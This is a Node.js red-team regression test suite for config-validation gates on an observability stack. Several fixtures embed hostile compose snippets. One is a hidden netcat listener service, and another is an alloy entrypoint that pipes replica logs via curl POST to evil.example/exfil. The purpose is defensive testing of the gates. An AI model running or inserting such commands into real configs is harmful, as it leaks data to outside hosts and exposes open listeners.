// stack-config-checks.redteam.test.mjs — regression teeth for REPRODUCED gate bypasses.
//
// PROVENANCE, stated plainly: the sibling `stack-config-checks.test.mjs` holds the EARS-derived
// gating suite and is owned by the `tester` agent (the implementer does not edit it). This file
// is separate and holds only regression fixtures for bypasses an independent `red-team` pass
// found AND executed against the shipped predicates — each attack below was demonstrated to
// return ok=true against a genuinely wrong config before the fix. The attacks are the red-team's;
// they are not self-invented by the implementer, which is what keeps the adversarial input
// independent even though this file was written during the landing phase.
//
// Every test therefore asserts the predicate now REJECTS an input it previously accepted.
// If one of these ever goes green-by-accepting again, the corresponding bypass is reopened.

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';

import {
  checkCaddyDualPosture,
  checkListenAddrsLoopback,
  checkNoExecLogSource,
  checkNoQuotedCredential,
  checkS4AttributeValuesBounded,
  checkS4MetricLabelsBounded,
  checkServiceSetExact,
} from './stack-config-checks.mjs';

const EXPECTED_SERVICE_NAMES = [
  'prometheus',
  'alloy',
  'loki',
  'tempo',
  'grafana',
  'node_exporter',
  'caddy',
];

function assertRejected(result, msg) {
  assert.equal(result.ok, false, `${msg} — expected REJECT, got ok=true (${result.detail})`);
  assert.ok(result.detail.length > 0, `${msg}: detail must explain the rejection`);
}

// ===========================================================================
// RT-1 (CRITICAL) — a QUOTED service key hid an entire rogue service from four
// gates at once. `docker compose config --services` listed all 8; the scanner saw 7.
// ===========================================================================

const COMPOSE_QUOTED_ROGUE = [
  'services:',
  '  prometheus:',
  '    network_mode: host',
  '    command:',
  '      - --web.listen-address=127.0.0.1:9090',
  '  alloy:',
  '    network_mode: host',
  '    command:',
  '      - --server.http.listen-addr=127.0.0.1:12345',
  '  loki:',
  '    network_mode: host',
  '    command:',
  '      - -server.http-listen-address=127.0.0.1',
  '  tempo:',
  '    network_mode: host',
  '    command:',
  '      - -server.http-listen-address=127.0.0.1',
  '  grafana:',
  '    network_mode: host',
  '    environment:',
  '      - GF_SERVER_HTTP_ADDR=127.0.0.1',
  '  node_exporter:',
  '    network_mode: host',
  '    command:',
  '      - --web.listen-address=127.0.0.1:9100',
  '  caddy:',
  '    network_mode: host',
  '    environment:',
  '      - MR_CADDY_BIND_ADDR=127.0.0.1',
  // The attack: a valid compose service whose key is quoted. It deploys; a line-oriented
  // scanner that only accepts bare keys walks straight past it — along with its listener.
  '  "mr-evil-relay":',
  '    network_mode: host',
  '    command: ["nc", "-lk", "-p", "9999"]',
].join('\n');

test('RT-1: a quoted service key must NOT hide a rogue service from checkServiceSetExact', () => {
  assertRejected(
    checkServiceSetExact(COMPOSE_QUOTED_ROGUE, EXPECTED_SERVICE_NAMES),
    'an 8th service with a quoted key is still a deployed service',
  );
});

test('RT-1: a quoted service key must NOT hide an unbound listener from checkListenAddrsLoopback', () => {
  assertRejected(
    checkListenAddrsLoopback(COMPOSE_QUOTED_ROGUE),
    'the hidden service binds no loopback address and must not be skipped',
  );
});

test('RT-1: inline/flow-style `services:` must be rejected, not silently unread', () => {
  const flow = 'services: {prometheus: {image: x}, alloy: {image: y}}';
  assertRejected(
    checkServiceSetExact(flow, EXPECTED_SERVICE_NAMES),
    'flow style is valid compose the scanner cannot read — it must fail closed',
  );
});

test('RT-1: quoting the alloy key must NOT hide a shell-exfil entrypoint override', () => {
  const alloyGood = [
    'loki.source.file "module_logs" {',
    '  forward_to = [loki.process.module_logs.receiver]',
    '}',
  ].join('\n');
  const compose = [
    'services:',
    '  "alloy":',
    '    image: grafana/alloy:v1.18.1',
    '    entrypoint: ["/bin/sh", "-c", "tail -F /data/replicas/*/module_logs/*.log | curl -X POST http://evil.example/exfil"]',
  ].join('\n');
  assertRejected(
    checkNoExecLogSource(alloyGood, compose),
    'one pair of quotes must not defeat the subprocess-log-tail ban',
  );
});

test('RT-7: a duplicate service key must be rejected (YAML is last-key-wins, not first)', () => {
  const dup = [
    'services:',
    '  prometheus:',
    '    network_mode: host',
    '    command:',
    '      - --web.listen-address=127.0.0.1:9090',
    '  prometheus:',
    '    network_mode: host',
    '    command:',
    '      - --web.listen-address=0.0.0.0:9090',
  ].join('\n');
  assertRejected(
    checkListenAddrsLoopback(dup),
    'first-match parsing would validate the cosmetically-correct decoy block',
  );
});

// ===========================================================================
// RT-3 (HIGH) — a trailing `//` decoy comment satisfied a substring wiring check
// while the receiver forwarded metrics straight to the exporter, unfiltered.
// ===========================================================================

test('RT-3: a decoy trailing comment must NOT satisfy the S4 filter-wiring check', () => {
  const alloyText = [
    'otelcol.receiver.otlp "s4" {',
    '  http { endpoint = "127.0.0.1:4318" } // filtered via otelcol.processor.attributes.s4_keep',
    '  output {',
    '    metrics = [otelcol.exporter.prometheus.s4.input]',
    '  }',
    '}',
    '',
    'otelcol.processor.attributes "s4_keep" {',
    '  output { metrics = [otelcol.exporter.prometheus.s4.input] }',
    '}',
    '',
    'otelcol.exporter.prometheus "s4" {',
    '  forward_to = [prometheus.remote_write.default.receiver]',
    '}',
    '',
    'prometheus.remote_write "default" {',
    '  endpoint { url = "http://127.0.0.1:9090/api/v1/write" }',
    '}',
  ].join('\n');
  assertRejected(
    checkS4MetricLabelsBounded(alloyText),
    'the receiver bypasses the filter entirely; only a real metrics=[...] reference is wiring',
  );
});

// ===========================================================================
// RT-4 (HIGH) — a decoy rate-limit zone with sane numbers laundered a real,
// functionally-unlimited zone, because extraction read the first match anywhere.
// ===========================================================================

test('RT-4: a decoy rate_limit zone must NOT launder an unlimited real zone', () => {
  const caddyfile = [
    'https://grafana.localhost:8443 {',
    '  tls internal',
    '  basic_auth {',
    '    operator {env.MR_GRAFANA_BASIC_AUTH_HASH}',
    '  }',
    '  reverse_proxy 127.0.0.1:3001',
    '}',
    '',
    'https://otlp.localhost:8443 {',
    '  tls internal',
    '  header Access-Control-Allow-Origin "https://localhost:5173"',
    '  rate_limit {',
    '    zone decoy_never_matches {',
    '      key {http.request.header.X-Never-Sent}',
    '      events 100',
    '      window 1m',
    '    }',
    '    zone otlp_ingest {',
    '      key {remote_host}',
    '      events 999999999',
    '      window 1s',
    '    }',
    '  }',
    '  request_body {',
    '    max_size 512KB',
    '  }',
    '  reverse_proxy 127.0.0.1:4318',
    '}',
  ].join('\n');
  assertRejected(
    checkCaddyDualPosture(caddyfile),
    'the zone that matches real traffic is functionally unlimited',
  );
});

// ===========================================================================
// RT-5 (HIGH) — case-sensitivity and a missing `hash` keyword made real
// committed credentials invisible, including the exact one this stack uses.
// ===========================================================================

test('RT-5: a LOWERCASE unquoted credential assignment must be caught', () => {
  assertRejected(
    checkNoQuotedCredential([
      { name: '.env.example', text: 'grafana_admin_password=hunter2hunter2reallylongsecret\n' },
    ]),
    'case-sensitivity must not make a leaked credential invisible',
  );
});

test('RT-5: a hardcoded bcrypt HASH must be caught (the credential this design centres on)', () => {
  assertRejected(
    checkNoQuotedCredential([
      {
        name: 'Caddyfile',
        text: 'basic_auth {\n  operator MR_HASH="$2a$14$abcdefghijklmnopqrstuvwxyz012345"\n}\n',
      },
    ]),
    'a bcrypt hash is a credential even though it is not named password/secret/token',
  );
});

// ===========================================================================
// RT-2 (CRITICAL) — the S4 allowlist bounded label KEYS but not VALUES, so an
// allowed-but-caller-supplied key (zone_id) still minted one series per request.
// ===========================================================================

test('RT-2: a key-only allowlist must NOT pass as a bounded S4 label space', () => {
  const alloyText = [
    'otelcol.receiver.otlp "s4" {',
    '  http { endpoint = "127.0.0.1:4318" }',
    '  output { metrics = [otelcol.processor.transform.s4_keep.input] }',
    '}',
    '',
    'otelcol.processor.transform "s4_keep" {',
    '  metric_statements {',
    '    context = "datapoint"',
    '    statements = [',
    '      `keep_matching_keys(attributes, "^(zone_id|build_sha|device_class)$")`,',
    '    ]',
    '  }',
    '  output { metrics = [otelcol.exporter.prometheus.s4.input] }',
    '}',
  ].join('\n');
  assertRejected(
    checkS4AttributeValuesBounded(alloyText),
    'zone_id is caller-supplied: an unconstrained value space is still a cardinality bomb',
  );
});

test('RT-2: non-vacuity — an S4 config with no receiver at all must not pass', () => {
  assertRejected(
    checkS4AttributeValuesBounded('otelcol.exporter.prometheus "s4" {}'),
    'nothing to bound',
  );
  assertRejected(checkS4AttributeValuesBounded(''), 'empty text must not vacuously pass');
});

// ===========================================================================
// The real committed config must satisfy the hardened predicates.
// ===========================================================================

const OPS_DIR = path.join(import.meta.dirname, '..');
const readOps = (rel) => readFileSync(path.join(OPS_DIR, rel), 'utf8');

test('REAL FILES: the committed Alloy config bounds S4 attribute VALUES, not just keys', () => {
  const result = checkS4AttributeValuesBounded(readOps('alloy/config.alloy'));
  assert.equal(result.ok, true, `real config.alloy: ${result.detail}`);
});

test('REAL FILES: .env.example carries no credential, quoted or unquoted', () => {
  // Explicitly scanned here because `.gitignore` un-ignores `.env.example` (it IS committed),
  // making it the file most likely to acquire a "helpful default" that is secret-shaped.
  const result = checkNoQuotedCredential([{ name: '.env.example', text: readOps('.env.example') }]);
  assert.equal(result.ok, true, `real .env.example: ${result.detail}`);
});
